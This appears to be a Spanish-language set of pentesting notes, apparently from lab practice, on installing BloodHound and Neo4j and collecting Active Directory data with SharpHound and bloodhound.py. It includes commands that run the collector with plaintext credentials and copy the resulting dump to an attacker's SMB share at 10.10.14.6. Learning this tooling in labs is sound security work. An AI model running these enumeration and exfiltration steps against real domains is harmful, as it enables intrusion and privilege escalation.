Herramienta para explorar la seguridad de un Active Directory.

Herramienta que analiza la seguridad de un controlador de dominio realizando ingestión de datos sobre el dominio y resaltando los potenciales puntos para la escalada de privilegios. Además proporciona rutas para ataques complejos que puedan comprometer la seguridad de la red.

La información que recoge es:
- Información de usuarios con derechos de administración.
- Usuarios que pueden acceder a otras máquinas de la red.
- Información de grupos.
- ETC

Instalación en Kali --> `apt-get install bloodhound`
Instalará Bloodhound y Neo4j.

Neo4j es una base de datos. Administrador de bases de dtos NoSQL. Esta herramienta sirve de apoyo a Bloodhound por su sistema de visualización en grafo representando las relaciones entre los datos obtenidos por Bloodhound.

** Uso **
`neo4j console`
username: neo4j || password: neo4j
neo4j corre en el puerto --> localhost:7474
Abrir Bloodhound en segundo plano --> `bloodhound &`
Desasociar el último proceso de su padre, en este caso, bloodhound de la consola --> `disown`

** Si neo4j no funciona correctamente, actualizar a java 11 **
`update-alternatives --config java`

** Dumpear o extraer la información del equipo objetivo **
> Descargar "injestor", binario compilado de sharphound (Sharphound.exe): https://github.com/BloodHoundAD/BloodHound/tree/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors
> Pasar Sharphound.exe a máquina objetivo con: SMB, servidor web, IWR, etc.
> Ejecutar archivo Sharphound:
> `C:\Windows\Temp\Sharphound.exe -c all --Ldapuser mrlky --LdapPass Football#7`
> Nos crea un archivo xxx_BloodHound.zip que debemos transferir a máquina atacante, donde debe estár corriendo Bloodhound con Neo4j.
> `net use \\10.10.14.6\smbFolder /u:s4vitar s4vitar`
> `copy xxx_BloodHound.zip \\10.10.14.6\smbFolder\xxx_BloodHound.zip`


** Vizualizar archivo xxx_BloodHound.zip en Bloodhound **
Pasar el archivo .zip a la consola web de Bloodhound --> localhost:7474

** Uso de Bloodhound sin tener que ejecutar Sharphound.exe en la máquina objetivo **
https://github.com/fox-it/BloodHound.py

Script que ejecuta operaciones contra los servicios ldap de la máquina objetivo para obtener información que después pueda ser representada en neo4j.

> `git clone https://github.com/fox-it/BloodHound.py.git`
> `python3 setup.py install`
> `python3 bloodhound.py -c all -u 'support' -p '<contraseña>' -d blacfield.local -ns 10.10.10.192`

